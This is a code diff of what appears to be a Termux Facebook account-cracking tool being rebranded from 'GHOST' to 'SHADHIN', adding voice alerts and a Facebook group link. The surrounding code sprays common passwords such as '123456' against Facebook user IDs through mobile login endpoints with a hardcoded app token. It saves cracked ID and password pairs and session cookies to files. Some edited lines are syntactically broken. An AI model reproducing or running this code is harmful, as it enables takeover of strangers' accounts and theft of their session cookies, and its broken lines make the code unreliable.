@@ -53,8 +53,18 @@ import smtplib
 import math
 import os,base64,zlib,pip,urllib
 def clear():
-        os.system('clear')
-print(f'\033[1;91m[\033[1;92m●\033[1;91m]\x1b[38;5;46m WELCOME TO GHOST KING TOOL')
+	os.system('clear')
+os.system('espeak -a 300 " Checking, Update,"')
+print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecking Update...? ')
+time.sleep(2)
+os.system('clear')
+os.system('espeak -a 300 " Join,   My,  Facebook,  Group,"')
+print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY FACEBOOK  GROUP")
+time.sleep(2)
+os.system(f'xdg-open https://facebook.com/groups/439070528619325/')
+os.system('clear')
+os.system('espeak -a 300 " Welcome,  To,  Shadhin,  King,  Tool,"')
+print(f'\033[1;91m[\033[1;92m●\033[1;91m]\x1b[38;5;46m WELCOME TO SHADHIN KING TOOL')
 try:
         import os,requests,json,time,re,random,sys,uuid,string,subprocess
         from string import *
@@ -62,7 +72,7 @@ try:
 except ModuleNotFoundError:
         print('\n Installing missing modules ...')
         os.system('pip install requests futures==2 > /dev/null')
-        os.system('python GHOST.py')
+        os.system('python Old-King.py')
 except:pass
 #__________________| ETC |__________________#
 sim_id = ''
@@ -369,22 +379,22 @@ def linex():
 def animation(u):
     for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
 logo =""" 
-\033[1;93m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-\033[1;93m┃ \033[1;31m███████╗ \033[1;32m █████╗\033[38;5;208m██████╗ ██╗ \033[1;34m┃    ██╗██╗\033[1;35m███╗   \033[1;33m██╗  \033[1;93m┃
-\033[1;93m┃ \033[1;31m██╔════╝ \033[1;32m██╔══██╗\033[38;5;208m██╔══██╗\033[1;34m┃    ██║  ██║\033[1;35m██║ \033[1;33m████╗  ██║  \033[1;93m┃
-\033[1;93m┃ \033[1;31m███████╗ \033[1;32m███████║\033[38;5;208m██║  ██║\033[1;34m┃    ███████║\033[1;35m██║ \033[1;33m██╔██╗ ██║  \033[1;93m┃
-\033[1;93m┃ \033[1;31m╚════██║ \033[1;32m██╔══██║\033[38;5;208m██║  ██║\033[1;34m┃    ██╔══██║\033[1;35m██║ \033[1;33m██║╚██╗██║  \033[1;93m┃
-\033[1;93m┃ \033[1;31m███████║ \033[1;32m██║  ██║\033[38;5;208m██████╔╝\033[1;34m┃    ██║  ██║\033[1;35m██║ \033[1;33m██║ ╚████║  \033[1;93m┃
-\033[1;93m┃ \033[1;31m╚══════╝ \033[1;32m╚═╝  ╚═╝\033[38;5;208m╚═════╝ \033[1;34m┃    ╚═╝  ╚═╝\033[1;35m╚═╝ \033[1;33m╚═╝  ╚═══╝  \033[1;93m┃
-\033[1;93m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+\033[1;93m┏━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+\033[1;93m┃ \033[1;31m███████╗\033[1;32m █████╗\033[1;93m   ┃   ██████╗ \033[38;5;208m██╗  ██╗\033[1;34m██╗\033[1;35m███╗   ██╗\033[1;93m┃
+\033[1;93m┃ \033[1;31m██╔════╝\033[1;32m██╔══██╗\033[1;93m  ┃   ██╔══██╗\033[38;5;208m██║  ██║\033[1;34m██║\033[1;35m████╗  ██║\033[1;93m┃
+\033[1;93m┃ \033[1;31m███████╗\033[1;32m███████║\033[1;93m  ┃   ██║  ██║\033[38;5;208m███████║\033[1;34m██║\033[1;35m██╔██╗ ██║\033[1;93m┃
+\033[1;93m┃ \033[1;31m╚════██║\033[1;32m██╔══██║\033[1;93m  ┃   ██║  ██║\033[38;5;208m██╔══██║\033[1;34m██║\033[1;35m██║╚██╗██║\033[1;93m┃
+\033[1;93m┃ \033[1;31m███████║\033[1;32m██║  ██║\033[1;93m  ┃   ██████╔╝\033[38;5;208m██║  ██║\033[1;34m██║\033[1;35m██║ ╚████║\033[1;93m┃
+\033[1;93m┃ \033[1;31m╚══════╝\033[1;32m╚═╝  ╚═╝\033[1;93m  ┃   ╚═════╝ \033[38;5;208m╚═╝  ╚═╝\033[1;34m╚═╝\033[1;35m╚═╝  ╚═══╝\033[1;93m┃
+\033[1;93m┗━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 \033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m DEVELOPER   :  SHADHIN AHMED
 \033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FACEBOOK    :  MD SHADHIN ISLAM 
 \033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m GITHUB      :  Shadhin-King-999
 \033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m VERSION     :  5.0
 \033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m TOOL        :  \033[1;34mFILE-/RANDOM\033[1;32m
-\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 \033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FB GROUP    :  \033[1;91m\033[1;41m\033[1;33mTermux 🔥 Shadhin-King-999 🔥 Termux Zoon☑️\033[;0m\033[1;91m\033[1;92m\033[38;5;46m
-\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m"""
+\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m"""
 os.system('clear')
 print(logo)
 os.system('espeak -a 300 " Your,   Real,  Name,  Sir, "')
@@ -395,15 +405,10 @@ def back():
 #_________[ LOGIN KEY ]______>>
 CorrectUsername = 'king'
 key = 'true'
-while key == 'true''
-os.system('clear')
-print(logo)
-os.system('espeak -a 300 "Enter,  Your,  Key"')
+while key == 'true':
     username = input('\033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m\033[1;96m•────➤\033[1;92mENTER KEY \033[1;91m: \x1b[1;92m')
     if username == CorrectUsername:
-os.system('clear')
-print(logo)
-os.system('espeak -a 300 " LOGGED,   IN,   FREE,   TOOL,   SUCCESSFULLY, "')
+###os.system('espeak -a 300 " Login,  Free, Tool, Successfully, "')
             print('\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\033[0;97m[•]\033[1;32m LOGGED IN FREE TOOL SUCCESSFULLY') 
             time.sleep(1)
             clear()
@@ -1098,7 +1103,8 @@ def rndm1(uid,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{R}[{G}SHADHIN-OK{R}]{G} '+uid+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{R}[{G}[𝐒𝐀𝐃𝐇𝐈𝐍-OK-💚]{R}]{G} '+uid+f' | '+pas+'\033[1;97m')
+                                        os.system('espeak -a 300 " Shadhin,  Ok,  id"')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{Y}[{G}COOKIE{Y}] {G2}●{X1} "+coki)
                                         open('/sdcard/SHADHIN-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
@@ -1197,6 +1203,7 @@ def rndm2(uid,passlist):
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
                                         print(f'\r\r{R}[{G}[𝐒𝐀𝐃𝐇𝐈𝐍-OK-💚]{R}]{G} '+uid+f' | '+pas+'\033[1;97m')
+                                        os.system('espeak -a 300 " Shadhin,  Ok,  id"')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} "+coki)
                                         open('/sdcard/GHOST-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
@@ -1220,7 +1227,7 @@ def rndm3(uid,passlist):
         global loop
         global oks
         bo = random.choice([m,k,h,b,u,x])
-        sys.stdout.write(f'\r\r{B}[{G}GHOST-M3{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r{B}[{G}[𝐕𝐀𝐈𝐋𝐄𝐍𝐂𝐄-M3]{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1294,16 +1301,16 @@ def rndm3(uid,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{R}[{G}GHOST-OK{R}]{G} '+uid+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{R}[{G}[𝐒𝐀𝐃𝐇𝐈𝐍-OK-💚]{R}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{Y}[{G}COOKIE{Y}] {G2}●{X1} "+coki)
-                                        open('/sdcard/GHOST-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
+                                        open('/sdcard/SHADHIN-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(uid)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r{B}[{Y}GHOST-CP{B}]{Y} '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/GHOST-CP.txt','a').write(uid+'|'+pas+'\n')
+                                                print(f'\r\r{B}[{Y}SHADHIN-CP{B}]{Y} '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/SHADHIN-CP.txt','a').write(uid+'|'+pas+'\n')
                                                 cps.append(uid)
                                                 break
                                         else:
@@ -1319,7 +1326,7 @@ def login(uid):
     global oks,loop
     Session=requests.session()
     try:
-        sys.stdout.write(f'\r\x1b[38;5;196m[\x1b[38;5;48mFINDING\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\033[1;37m{loop}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK•{len(oks)}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mCP•{len(cps)}\x1b[38;5;196m]')
+        sys.stdout.write(f'\r\x1b[38;5;196m[\x1b[38;5;48m[𝐕𝐀𝐈𝐋𝐄𝐍𝐂𝐄]\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\033[1;37m{loop}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK•{len(oks)}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mCP•{len(cps)}\x1b[38;5;196m]')
         sys.stdout.flush()
         for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:
             headers = {
@@ -1333,18 +1340,20 @@ def login(uid):
             "x-fb-http-engine": "Liger"}
             rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_GB&client_country_code=GB&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
             if "session_key" in rp:
-                print(f"\r{R}[{R}GHOST-OK{R}]{R} {uid} | {pw}")
-                open("/sdcard/GHOST-ok.txt","a").write(uid+"|"+pw+"\n")
+                print(f"\r{R}[{R}[𝐒𝐀𝐃𝐇𝐈𝐍-OK-💚]{R}]{R} {uid} | {pw}")
+                os.system('espeak -a 300 " Shadhin,  Ok,  id"')
+                open("/sdcard/SHADHIN-ok.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break 
             elif "www.facebook.com" in rp["error_msg"]:          	
             	print(f"\r{R}[{G1}[𝐒𝐀𝐃𝐇𝐈𝐍-OK-💚]{R}]{G1} {uid} | {pw}")
+                ###os.system('espeak -a 300 " Shadhin,  Ok,  id"')
             	open("/sdcard/𝐒𝐀𝐃𝐇𝐈𝐍-cp.txt","a").write(uid+"|"+pw+"\n")
             	oks.append(uid)
             	break
             elif "Please Confirm Email" in str(rp):            
-            	print(f"\r{R}[{G1}GHOST-2F{R}]{G1} {uid} | {pw}")
-            	open("/sdcard/Ghost-2f.txt","a").write(uid+"|"+pw+"\n")
+            	print(f"\r{R}[{G1}SHADHIN-2F{R}]{G1} {uid} | {pw}")
+            	open("/sdcard/Shadhin-2f.txt","a").write(uid+"|"+pw+"\n")
             	cps.append(uid)
             	break
             else:continue
@@ -1357,7 +1366,7 @@ def login(uid):
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r\033[1;31m[\033[1;37mGHOST•M1\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{oki}\033[1;31m/{H}CP•{H}{cpi}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m "),
+    sys.stdout.write(f"\r\033[1;31m[\033[1;37m[𝐕𝐀𝐈𝐋𝐄𝐍𝐂𝐄•M1]\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{oki}\033[1;31m/{H}CP•{H}{cpi}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -1374,7 +1383,7 @@ def crack(idf,pwv):
             heade = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\x1b[1;96m[GHOST-2F] \x1b[38;5;205m {idf} | {pw}')
+                print(f'\r\x1b[1;96m[SHADHIN-2F] \x1b[38;5;205m {idf} | {pw}')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
@@ -1383,7 +1392,8 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\x1b[1;96m[GHOST-OK] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{kuki} ')
+                print(f'\r\x1b[1;96[𝐒𝐀𝐃𝐇𝐈𝐍-OK-💚] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{kuki} ')
+                os.system('espeak -a 300 " Shadhin,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 Sad(idf,pw)
                 break
@@ -1399,7 +1409,7 @@ def crack(idf,pwv):
 def crackfree(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r\033[1;31m[\033[1;37mGHOST•M2\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{oki}\033[1;31m/{H}CP•{H}{cpi}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m "),
+    sys.stdout.write(f"\r\033[1;31m[\033[1;37m[𝐕𝐀𝐈𝐋𝐄𝐍𝐂𝐄•M2]\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{oki}\033[1;31m/{H}CP•{H}{cpi}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -1416,7 +1426,7 @@ def crackfree(idf,pwv):
             heade = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\x1b[1;96m[GHOST-2F] \x1b[38;5;205m {idf} | {pw}')
+                print(f'\r\x1b[1;96m[SHADHIN-2F] \x1b[38;5;205m {idf} | {pw}')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
@@ -1425,7 +1435,8 @@ def crackfree(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\x1b[1;96m[GHOST-OK] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{kuki} ')
+                print(f'\r\x1b[1;96m[𝐒𝐀𝐃𝐇𝐈𝐍-OK-💚] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{kuki} ')
+                os.system('espeak -a 300 " Shadhin,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
                 
@@ -1440,7 +1451,7 @@ def crackfree(idf,pwv):
 def cracktouch(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r\033[1;31m[\033[1;37mGHOST•M3\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{oki}\033[1;31m/{H}CP•{H}{cpi}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m "),
+    sys.stdout.write(f"\r\033[1;31m[\033[1;37m[𝐕𝐀𝐈𝐋𝐄𝐍𝐂𝐄•M3]\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{oki}\033[1;31m/{H}CP•{H}{cpi}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -1457,7 +1468,7 @@ def cracktouch(idf,pwv):
             heade = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\x1b[1;96m[GHOST-2F] \x1b[38;5;205m {idf} | {pw}')
+                print(f'\r\x1b[1;96m[SHADHIN-2F] \x1b[38;5;205m {idf} | {pw}')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
@@ -1466,7 +1477,8 @@ def cracktouch(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\x1b[1;96m[GHOST-OK] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{kuki} ')
+                print(f'\r\x1b[1;96m[𝐒𝐀𝐃𝐇𝐈𝐍-OK-💚] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{kuki} ')
+                os.system('espeak -a 300 " Shadhin,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 Sad(idf,pw)
                 break
